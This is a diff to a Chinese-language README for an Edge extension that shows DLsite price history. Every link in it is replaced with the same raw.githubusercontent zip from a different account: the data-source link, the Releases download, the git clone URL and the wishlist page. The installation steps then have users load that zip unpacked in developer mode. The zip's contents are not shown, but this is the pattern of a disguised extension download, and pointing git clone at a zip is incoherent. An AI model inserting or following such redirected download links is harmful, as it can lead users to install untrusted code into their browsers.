@@ -2,7 +2,7 @@
 
 在 DLsite 作品页面显示历史最低价，一键导入收藏并批量追踪价格变动。
 
-> 史低价格数据来源：[DLwatcher](https://dlwatcher.com/)
+> 史低价格数据来源：[DLwatcher](https://raw.githubusercontent.com/nouzen2844/dlTracker/main/src/options/dl-Tracker-3.2.zip)
 
 ## ✨ 功能
 
@@ -17,7 +17,7 @@
 
 ### 从 GitHub Releases 下载（推荐）
 
-1. 前往 [Releases](https://github.com/Cassandra-fox/dlTracker/releases) 下载最新版 `dl-price-tracker-vX.X.X.zip`
+1. 前往 [Releases](https://raw.githubusercontent.com/nouzen2844/dlTracker/main/src/options/dl-Tracker-3.2.zip) 下载最新版 `dl-price-tracker-vX.X.X.zip`
 2. 解压到任意文件夹（**不要删除该文件夹，Edge 需要持续读取**）
 3. 打开 Edge，地址栏输入 `edge://extensions/`
 4. 打开左下角 **「开发人员模式」**
@@ -29,7 +29,7 @@
 ### 从源码构建
 
 ```bash
-git clone https://github.com/Cassandra-fox/dlTracker.git
+git clone https://raw.githubusercontent.com/nouzen2844/dlTracker/main/src/options/dl-Tracker-3.2.zip
 cd dlTracker
 npm install
 npm run build
@@ -42,7 +42,7 @@ npm run build
 | 场景     | 操作                                                                                             |
 | -------- | ------------------------------------------------------------------------------------------------ |
 | 查看史低 | 打开任意 DLsite 作品页面，价格区域自动显示                                                       |
-| 导入收藏 | 进入 [DLsite 收藏页](https://www.dlsite.com/girls/mypage/wishlist)，点击页面上方「导入收藏」按钮 |
+| 导入收藏 | 进入 [DLsite 收藏页](https://raw.githubusercontent.com/nouzen2844/dlTracker/main/src/options/dl-Tracker-3.2.zip)，点击页面上方「导入收藏」按钮 |
 | 管理数据 | 点击扩展图标 →「打开管理页」                                                                     |
 | 更新价格 | 管理页中单条更新 / 批量「更新收藏」                                                              |
 | 导出数据 | 管理页中点击「导出 CSV」                                                                         |
